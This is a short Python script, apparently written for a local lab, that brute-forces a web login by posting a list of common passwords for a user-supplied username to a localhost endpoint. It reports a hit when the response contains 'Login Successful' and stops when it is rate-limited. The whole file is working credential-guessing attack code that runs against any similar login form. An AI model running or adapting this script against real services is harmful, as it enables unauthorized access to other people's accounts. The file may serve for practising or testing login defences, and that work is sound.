import requests
import login_system

common_passwords = [
    "654321", "password", "welcome", "admin2", "protect123", "123456"
]

def brute_force_login(username, password_list):
    for password in password_list:
        print(f"Trying password: {password}")
        response = requests.post('http://127.0.0.2:4000/login', data={'username': username, 'password': password})
        # if login_system.login(username, password):
        print(f"Response: {response.text}")
        if "Login Successful" in response.text:
            return f"Password found: {password}"
        elif response.status_code == 429:
            print("Rate limit exceeded. Please wait before trying again.")
            break
    return "Password not found in the list."
    
username = input("Enter the username for brute forcing:" )
result = brute_force_login(username, common_passwords)
print(result)